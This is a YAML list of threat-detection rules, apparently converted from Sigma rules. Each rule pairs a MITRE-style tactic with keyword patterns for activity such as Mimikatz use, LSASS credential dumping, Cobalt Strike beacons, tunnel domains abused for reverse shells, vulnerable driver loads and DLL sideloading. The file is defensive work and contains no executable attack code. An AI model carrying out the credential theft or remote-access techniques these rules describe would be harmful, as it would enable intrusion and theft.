- id: sigma_06d71506_7beb_4f22_8888_e2e5e2ca7fd8
  intent: credential_harvesting
  tactic: credential_access
  description: This method detects mimikatz keywords in different Eventlogs (some
    of them only appear in older Mimikatz version that are however still used by different
    threat groups)
  conditions:
    summary:
      regex_any:
      - mimikatz
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2e4e488a_6164_4811_9ea1_f960c7359c40
  intent: execution
  tactic: execution
  description: Detects remote thread creation from CACTUSTORCH as described in references.
  conditions:
    summary:
      regex_any:
      - hacktool
      - cactustorch
      - remote
      - thread
      - creation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6309645e_122d_4c5b_bb2b_22e4f9c2fa42
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects a potential remote threat creation with certain characteristics
    which are typical for Cobalt Strike beacons
  conditions:
    summary:
      regex_any:
      - hacktool
      - potential
      - cobaltstrike
      - process
      - injection
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_77564cc2_7382_438b_a7f6_395c2ae53b9a
  intent: credential_harvesting
  tactic: credential_access
  description: Detects remote thread creation in "KeePass.exe" which could indicates
    potential password dumping activity
  conditions:
    summary:
      regex_any:
      - remote
      - thread
      - created
      - keepass
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c0aac16a_b1e7_4330_bab0_3c27bb4987c7
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects remote thread creation in the "mstsc.exe" process by a process
    located in a potentially suspicious location.

    This technique is often used by attackers in order to hook some APIs used by DLLs
    loaded by "mstsc.exe" during RDP authentications in order to steal credentials.

    '
  conditions:
    summary:
      regex_any:
      - remote
      - thread
      - creation
      - mstsc
      - from
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fb656378_f909_47c1_8747_278bf09f4f4f
  intent: credential_harvesting
  tactic: credential_access
  description: Detects remote thread creation by PowerShell processes into "lsass.exe"
  conditions:
    summary:
      regex_any:
      - potential
      - credential
      - dumping
      - attempt
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_99b97608_3e21_4bfe_8217_2a127c396a0e
  intent: execution
  tactic: execution
  description: Detects the creation of a remote thread from a Powershell process in
    an uncommon target process
  conditions:
    summary:
      regex_any:
      - remote
      - thread
      - creation
      - powershell
      - uncommon
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f239b326_2f41_4d6b_9dfa_c846a60ef505
  intent: unknown
  tactic: s0005
  description: 'Detects password dumper activity by monitoring remote thread creation
    EventID 8 in combination with the lsass.exe process as TargetImage.

    The process in field Process is the malicious program. A single execution can
    lead to hundreds of events.

    '
  conditions:
    summary:
      regex_any:
      - password
      - dumper
      - remote
      - thread
      - lsass
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_02d1d718_dd13_41af_989d_ea85c7fab93f
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects uncommon processes creating remote threads.
  conditions:
    summary:
      regex_any:
      - rare
      - remote
      - thread
      - creation
      - uncommon
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_66d31e5f_52d6_40a4_9615_002d3789a119
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects uncommon processes creating remote threads.
  conditions:
    summary:
      regex_any:
      - remote
      - thread
      - creation
      - uncommon
      - source
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a1a144b7_5c9b_4853_a559_2172be8d4a03
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects uncommon target processes for remote thread creation
  conditions:
    summary:
      regex_any:
      - remote
      - thread
      - creation
      - uncommon
      - target
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c15e99a3_c474_48ab_b9a7_84549a7a9d16
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects a remote thread creation of Ttdinject.exe used as proxy
  conditions:
    summary:
      regex_any:
      - remote
      - thread
      - creation
      - ttdinject
      - proxy
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b69888d4_380c_45ce_9cf9_d9ce46e67821
  intent: unknown
  tactic: s0139
  description: Detects the creation of an ADS (Alternate Data Stream) that contains
    an executable by looking at a non-empty Imphash
  conditions:
    summary:
      regex_any:
      - hidden
      - executable
      - ntfs
      - alternate
      - data
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_573df571_a223_43bc_846e_3f98da481eca
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the creation of a suspicious ADS (Alternate Data Stream) file
    by software other than browsers
  conditions:
    summary:
      regex_any:
      - creation
      - suspicious
      - file
      - outside
      - browser
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_52182dfb_afb7_41db_b4bc_5336cb29b464
  intent: unknown
  tactic: s0139
  description: Detects the download of suspicious file type from a well-known file
    and paste sharing domain
  conditions:
    summary:
      regex_any:
      - suspicious
      - file
      - download
      - from
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ae02ed70_11aa_4a22_b397_c0d0e8f6ea99
  intent: unknown
  tactic: s0139
  description: Detects the download of suspicious file type from a well-known file
    and paste sharing domain
  conditions:
    summary:
      regex_any:
      - unusual
      - file
      - download
      - from
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_19b041f6_e583_40dc_b842_d6fa8011493f
  intent: unknown
  tactic: s0139
  description: Detects the creation of a named file stream with the imphash of a well-known
    hack tool
  conditions:
    summary:
      regex_any:
      - hacktool
      - named
      - file
      - stream
      - created
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0d7a9363_af70_4e7b_a3b7_1a176b7fbe84
  intent: defense_evasion
  tactic: defense_evasion
  description: Exports the target Registry key and hides it in the specified alternate
    data stream.
  conditions:
    summary:
      regex_any:
      - exports
      - registry
      - alternate
      - data
      - stream
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_025bd229_fd1f_4fdb_97ab_20006e1a5368
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the download of suspicious file type from URLs with IP
  conditions:
    summary:
      regex_any:
      - unusual
      - file
      - download
      - from
      - direct
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a3f5c081_e75b_43a0_9f5b_51f26fe5dba2
  intent: persistence_installation
  tactic: persistence
  description: Detects potential suspicious winget package installation from a suspicious
    source.
  conditions:
    summary:
      regex_any:
      - potential
      - suspicious
      - winget
      - package
      - installation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0bb4bbeb_fe52_4044_b40c_430a04577ebe
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the download of a file with a potentially suspicious extension
    from a .zip top level domain.
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - file
      - download
      - from
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_065cceea_77ec_4030_9052_fc0affea7110
  intent: data_exfiltration
  tactic: exfiltration
  description: Detects DNS queries for "anonfiles.com", which is an anonymous file
    upload platform often used for malicious purposes
  conditions:
    summary:
      regex_any:
      - query
      - anonfiles
      - domain
      - sysmon
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7cff77e1_9663_46a3_8260_17f2e1aa9d0a
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects DNS queries made by "AppInstaller.EXE". The AppInstaller is
    the default handler for the "ms-appinstaller" URI. It attempts to load/install
    a package from the referenced URL

    '
  conditions:
    summary:
      regex_any:
      - appx
      - package
      - installation
      - attempts
      - appinstaller
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a1d9eec5_33b2_4177_8d24_27fe754d0812
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects DNS requests to Cloudflared tunnels domains.

    Attackers can abuse that feature to establish a reverse shell or persistence on
    a machine.

    '
  conditions:
    summary:
      regex_any:
      - cloudflared
      - tunnels
      - related
      - requests
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f8c1e80b_c73a_476a_ae24_6c72528b1521
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects DNS queries to domains commonly used by threat actors to host
    malware payloads or redirect through URL shorteners.

    These include platforms like Cloudflare Workers, TryCloudflare, InfinityFree,
    and URL shorteners such as tinyurl and lihi.cc.

    Such DNS activity can indicate potential delivery or command-and-control communication
    attempts.

    '
  conditions:
    summary:
      regex_any:
      - query
      - common
      - malware
      - hosting
      - shortener
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1cb0c6ce_3d00_44fc_ab9c_6d6d577bf20b
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects DNS query requests to Devtunnels domains. Attackers can abuse
    that feature to establish a reverse shell or persistence on a machine.

    '
  conditions:
    summary:
      regex_any:
      - query
      - devtunnels
      - domain
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e043f529_8514_4205_8ab0_7f7d2927b400
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects a DNS query by a non browser process on the system to "azurewebsites.net".
    The latter was often used by threat actors as a malware hosting and exfiltration
    site.

    '
  conditions:
    summary:
      regex_any:
      - query
      - azurewebsites
      - browser
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7bd3902d_8b8b_4dd4_838a_c6862d40150d
  intent: persistence_installation
  tactic: persistence
  description: Detects Azure Hybrid Connection Manager services querying the Azure
    service bus service
  conditions:
    summary:
      regex_any:
      - hybridconnectionmanager
      - service
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e7a21b5f_d8c4_4ae5_b8d9_93c5d3f28e1c
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects DNS queries containing patterns associated with Kerberos coercion
    attacks via DNS object spoofing.

    The pattern "1UWhRCAAAAA..BAAAA" is a base64-encoded signature that corresponds
    to a marshaled CREDENTIAL_TARGET_INFORMATION structure.

    Attackers can use this technique to coerce authentication from victim systems
    to attacker-controlled hosts.

    It is one of the strong indicators of a Kerberos coercion attack, where adversaries
    manipulate DNS records

    to spoof Service Principal Names (SPNs) and redirect authentication requests like
    CVE-2025-33073.

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - query
      - indicating
      - kerberos
      - coercion
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f356a9c4_effd_4608_bbf8_408afd5cd006
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects a program that invoked suspicious DNS queries known from Cobalt
    Strike beacons
  conditions:
    summary:
      regex_any:
      - suspicious
      - cobalt
      - strike
      - beaconing
      - sysmon
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_613c03ba_0779_4a53_8a1f_47f914a4ded3
  intent: data_exfiltration
  tactic: exfiltration
  description: Detects DNS queries for subdomains related to MEGA sharing website
  conditions:
    summary:
      regex_any:
      - query
      - mega
      - hosting
      - website
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_36e037c4_c228_4866_b6a3_48eb292b9955
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects DNS queries initiated by "Regsvr32.exe"
  conditions:
    summary:
      regex_any:
      - query
      - request
      - regsvr32
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4d07b1f4_cb00_4470_b9f8_b0191d48ff52
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'An adversary may use legitimate desktop support and remote access
    software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish
    an interactive command and control channel to target systems within networks.

    These services are commonly used as legitimate technical support software, and
    may be allowed by application control within a target environment.

    Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared
    with other legitimate software commonly used by adversaries. (Citation: Symantec
    Living off the Land)

    '
  conditions:
    summary:
      regex_any:
      - query
      - remote
      - access
      - software
      - domain
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ec82e2a5_81ea_4211_a1f8_37a0286df2c2
  intent: unknown
  tactic: reconnaissance
  description: Detects DNS queries for IP lookup services such as "api.ipify.org"
    originating from a non browser process.
  conditions:
    summary:
      regex_any:
      - suspicious
      - query
      - lookup
      - service
      - apis
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_778ba9a8_45e4_4b80_8e3e_34a419f0b85e
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects DNS queries to a TeamViewer domain only resolved by a TeamViewer
    client by an image that isn't named TeamViewer (sometimes used by threat actors
    for obfuscation)
  conditions:
    summary:
      regex_any:
      - teamviewer
      - domain
      - query
      - teamviewer
      - application
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b55ca2a3_7cff_4dda_8bdd_c7bfa63bf544
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects DNS queries to an ".onion" address related to Tor routing networks
  conditions:
    summary:
      regex_any:
      - query
      - onion
      - address
      - sysmon
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b3e6418f_7c7a_4fad_993a_93b65027a9f1
  intent: command_and_control_setup
  tactic: command_and_control
  description: 'Detects DNS query requests to Visual Studio Code tunnel domains. Attackers
    can abuse that feature to establish a reverse shell or persistence on a machine.

    '
  conditions:
    summary:
      regex_any:
      - query
      - visual
      - studio
      - code
      - tunnels
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_05296024_fe8a_4baf_8f3d_9a5f5624ceb2
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects loading of known malicious drivers via their hash.
  conditions:
    summary:
      regex_any:
      - malicious
      - driver
      - load
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_39b64854_5497_4b57_a448_40977b8c9679
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects loading of known malicious drivers via the file name of the
    drivers.
  conditions:
    summary:
      regex_any:
      - malicious
      - driver
      - load
      - name
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_67add051_9ee7_4ad3_93ba_42935615ae8d
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects driver load of the Process Hacker tool
  conditions:
    summary:
      regex_any:
      - process
      - hacker
      - driver
      - load
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_10cb6535_b31d_4512_9962_513dcbc42cc1
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects driver load of the System Informer tool
  conditions:
    summary:
      regex_any:
      - system
      - informer
      - driver
      - load
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2c4523d5_d481_4ed0_8ec3_7fbf0cb41a75
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects a driver load from a temporary directory
  conditions:
    summary:
      regex_any:
      - driver
      - load
      - from
      - temporary
      - directory
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7aaaf4b8_e47c_4295_92ee_6ed40a6f60c8
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects loading of known vulnerable drivers via their hash.
  conditions:
    summary:
      regex_any:
      - vulnerable
      - driver
      - load
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_295c9289_acee_4503_a571_8eacaef36b28
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the load of HackSys Extreme Vulnerable Driver which is an intentionally
    vulnerable Windows driver developed for security enthusiasts to learn and polish
    their exploitation skills at Kernel level and often abused by threat actors
  conditions:
    summary:
      regex_any:
      - vulnerable
      - hacksys
      - extreme
      - vulnerable
      - driver
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1a42dfa6_6cb2_4df9_9b48_295be477e835
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects the load of a signed WinRing0 driver often used by threat actors,
    crypto miners (XMRIG) or malware for privilege escalation
  conditions:
    summary:
      regex_any:
      - vulnerable
      - winring0
      - driver
      - load
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_679085d5_f427_4484_9f58_1dc30a7c426d
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the load of the Windiver driver, a powerful user-mode capture/sniffing/modification/blocking/re-injection
    package for Windows
  conditions:
    summary:
      regex_any:
      - windivert
      - driver
      - load
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fb4e2211_6d08_426b_8e6f_0d4a161e3b1d
  intent: execution
  tactic: execution
  description: Detects Clfs.sys being loaded by a process running from a potentially
    suspicious location. Clfs.sys is loaded as part of many CVEs exploits that targets
    Common Log File.
  conditions:
    summary:
      regex_any:
      - clfs
      - loaded
      - process
      - located
      - potential
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_75e508f7_932d_4ebc_af77_269237a84ce1
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects cmstp loading "dll" or "ocx" files from suspicious locations
  conditions:
    summary:
      regex_any:
      - loaded
      - from
      - suspicious
      - location
      - cmspt
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6ec86d9e_912e_4726_91a2_209359b999b9
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects loading of "Amsi.dll" by a living of the land process. This
    could be an indication of a "PowerShell without PowerShell" attack
  conditions:
    summary:
      regex_any:
      - amsi
      - loaded
      - lolbin
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8cde342c_ba48_4b74_b615_172c330f2e93
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects rundll32 loading a renamed comsvcs.dll to dump process memory
  conditions:
    summary:
      regex_any:
      - suspicious
      - renamed
      - comsvcs
      - loaded
      - rundll32
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9ae01559_cf7e_4f8e_8e14_4c290a1b4784
  intent: data_staging
  tactic: collection
  description: Detects loading of "credui.dll" and related DLLs by an uncommon process.
    Attackers might leverage this DLL for potential use of "CredUIPromptForCredentials"
    or "CredUnPackAuthenticationBufferW".
  conditions:
    summary:
      regex_any:
      - credui
      - loaded
      - uncommon
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bdc64095_d59a_42a2_8588_71fd9c9d9abc
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects the load of dbghelp/dbgcore DLL (used to make memory dumps)
    by suspicious processes.

    Tools like ProcessHacker and some attacker tradecract use MiniDumpWriteDump API
    found in dbghelp.dll or dbgcore.dll.

    As an example, SilentTrynity C2 Framework has a module that leverages this API
    to dump the contents of Lsass.exe and transfer it over the network back to the
    attacker''s machine.

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - unsigned
      - dbghelp
      - dbgcore
      - loaded
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_84b0a8f3_680b_4096_a45b_e9a89221727c
  intent: execution
  tactic: execution
  description: Detects processes loading modules related to PCRE.NET package
  conditions:
    summary:
      regex_any:
      - pcre
      - package
      - image
      - load
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b48492dc_c5ef_4572_8dff_32bc241c15c8
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects the load of RstrtMgr DLL (Restart Manager) by a suspicious
    process.

    This library has been used during ransomware campaigns to kill processes that
    would prevent file encryption by locking them (e.g. Conti ransomware, Cactus ransomware).
    It has also recently been seen used by the BiBi wiper for Windows.

    It could also be used for anti-analysis purposes by shut downing specific processes.

    '
  conditions:
    summary:
      regex_any:
      - load
      - rstrtmgr
      - suspicious
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ec8c4047_fad9_416a_8c81_0f479353d7f6
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects both of CVE-2022-30190 (Follina) and DogWalk vulnerabilities
    exploiting msdt.exe binary to load the "sdiageng.dll" library
  conditions:
    summary:
      regex_any:
      - diagnostic
      - library
      - sdiageng
      - loaded
      - msdt
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_092bc4b9_3d1d_43b4_a6b4_8c8acd83522f
  intent: execution
  tactic: execution
  description: 'Detects loading of essential DLLs used by PowerShell by non-PowerShell
    process.

    Detects behavior similar to meterpreter''s "load powershell" extension.

    '
  conditions:
    summary:
      regex_any:
      - powershell
      - core
      - loaded
      - powershell
      - process
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e76c8240_d68f_4773_8880_5c6f63595aaf
  intent: credential_harvesting
  tactic: credential_access
  description: Detects usage of Time Travel Debugging Utility. Adversaries can execute
    malicious processes and dump processes, such as lsass.exe, via tttracer.exe.
  conditions:
    summary:
      regex_any:
      - time
      - travel
      - debugging
      - utility
      - usage
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_37774c23_25a1_4adb_bb6d_8bb9fd59c0f8
  intent: impact_operations
  tactic: impact
  description: Detects the image load of VSS DLL by uncommon executables
  conditions:
    summary:
      regex_any:
      - suspicious
      - volume
      - shadow
      - copy
      - vssapi
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_48bfd177_7cf2_412b_ad77_baf923489e82
  intent: impact_operations
  tactic: impact
  description: Detects the image load of VSS DLL by uncommon executables
  conditions:
    summary:
      regex_any:
      - potentially
      - suspicious
      - volume
      - shadow
      - copy
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_333cdbe8_27bb_4246_bf82_b41a0dca4b70
  intent: impact_operations
  tactic: impact
  description: 'Detects the image load of vss_ps.dll by uncommon executables. This
    DLL is used by the Volume Shadow Copy Service (VSS) to manage shadow copies of
    files and volumes.

    It is often abused by attackers to delete or manipulate shadow copies, which can
    hinder forensic investigations and data recovery efforts.

    The fact that it is loaded by processes that are not typically associated with
    VSS operations can indicate suspicious activity.

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - volume
      - shadow
      - copy
      - vss_ps
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_49329257_089d_46e6_af37_4afce4290685
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects the load of EvtMuteHook.dll, a key component of SharpEvtHook,
    a tool that tampers with the Windows event logs
  conditions:
    summary:
      regex_any:
      - hacktool
      - sharpevtmute
      - load
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_75c505b1_711d_4f68_a357_8c3fe37dbf2d
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects SILENTTRINITY stager dll loading activity
  conditions:
    summary:
      regex_any:
      - hacktool
      - silenttrinity
      - stager
      - load
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f354eba5_623b_450f_b073_0b5b2773b6aa
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects potential DLL hijack of "iertutil.dll" found in the DCOM InternetExplorer.Application
    Class
  conditions:
    summary:
      regex_any:
      - potential
      - dcom
      - internetexplorer
      - application
      - hijack
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_857c8db3_c89b_42fb_882b_f681c7cf4da2
  intent: credential_harvesting
  tactic: credential_access
  description: Loading unsigned image (DLL, EXE) into LSASS process
  conditions:
    summary:
      regex_any:
      - unsigned
      - image
      - loaded
      - into
      - lsass
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ff0f2b05_09db_4095_b96d_1b75ca24894a
  intent: execution
  tactic: execution
  description: Detects any assembly DLL being loaded by an Office Product
  conditions:
    summary:
      regex_any:
      - dotnet
      - assembly
      - loaded
      - office
      - application
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d13c43f0_f66b_4279_8b2c_5912077c1780
  intent: execution
  tactic: execution
  description: Detects CLR DLL being loaded by an Office Product
  conditions:
    summary:
      regex_any:
      - loaded
      - office
      - applications
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_90217a70_13fc_48e4_b3db_0d836c5824ac
  intent: execution
  tactic: execution
  description: Detects any GAC DLL being loaded by an Office Product
  conditions:
    summary:
      regex_any:
      - loaded
      - office
      - applications
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_af4c4609_5755_42fe_8075_4effb49f5d44
  intent: execution
  tactic: execution
  description: Detects Microsoft Excel loading an Add-In (.xll) file from an uncommon
    location
  conditions:
    summary:
      regex_any:
      - microsoft
      - excel
      - loaded
      - from
      - uncommon
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7417e29e_c2e7_4cf6_a2e8_767228c64837
  intent: execution
  tactic: execution
  description: Detects Kerberos DLL being loaded by an Office Product
  conditions:
    summary:
      regex_any:
      - active
      - directory
      - kerberos
      - loaded
      - office
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9a0b8719_cd3c_4f0a_90de_765a4cb3f5ed
  intent: execution
  tactic: execution
  description: Detects outlvba (Microsoft VBA for Outlook Addin) DLL being loaded
    by the outlook process
  conditions:
    summary:
      regex_any:
      - microsoft
      - outlook
      - addin
      - loaded
      - outlook
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bb2ba6fb_95d4_4a25_89fc_30bb736c021a
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects PowerShell core DLL being loaded by an Office Product
  conditions:
    summary:
      regex_any:
      - powershell
      - core
      - loaded
      - office
      - application
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e6ce8457_68b1_485b_9bdd_3c2b5d679aa9
  intent: execution
  tactic: execution
  description: Detects VB DLL's loaded by an office application. Which could indicate
    the presence of VBA Macros.
  conditions:
    summary:
      regex_any:
      - loaded
      - office
      - application
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f40017b3_cb2e_4335_ab5d_3babf679c1de
  intent: execution
  tactic: execution
  description: Detects a remote DLL load event via "rundll32.exe".
  conditions:
    summary:
      regex_any:
      - remote
      - load
      - rundll32
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b439f47d_ef52_4b29_9a2f_57d8a96cb6b8
  intent: persistence_installation
  tactic: persistence
  description: Detects signs of the WMI script host process "scrcons.exe" loading
    scripting DLLs which could indicates WMI ActiveScriptEventConsumers EventConsumers
    activity.
  conditions:
    summary:
      regex_any:
      - activescripteventconsumers
      - activity
      - scrcons
      - load
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_799a5f48_0ac1_4e0f_9152_71d137d48c2a
  intent: execution
  tactic: execution
  description: Detects potential DLL sideloading of DLLs that are known to be abused
    from suspicious locations
  conditions:
    summary:
      regex_any:
      - abusable
      - potential
      - sideloading
      - from
      - suspicious
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_552b6b65_df37_4d3e_a258_f2fc4771ae54
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects potential DLL sideloading of DLLs that are part of antivirus
    software suchas McAfee, Symantec...etc
  conditions:
    summary:
      regex_any:
      - potential
      - antivirus
      - software
      - sideloading
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ee6cea48_c5b6_4304_a332_10fc6446f484
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects potential DLL sideloading of "appverifUI.dll"
  conditions:
    summary:
      regex_any:
      - potential
      - appverifui
      - sideloading
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_90ae0469_0cee_4509_b67f_e5efcef040f7
  intent: persistence_installation
  tactic: persistence
  description: Detects potential DLL sideloading activity via the Aruba Networks Virtual
    Intranet Access "arubanetsvc.exe" process using DLL Search Order Hijacking
  conditions:
    summary:
      regex_any:
      - aruba
      - network
      - service
      - potential
      - sideloading
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_952ed57c_8f99_453d_aee0_53a49c22f95d
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: Detects potential DLL sideloading of "AVKkid.dll"
  conditions:
    summary:
      regex_any:
      - potential
      - avkkid
      - sideloading
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
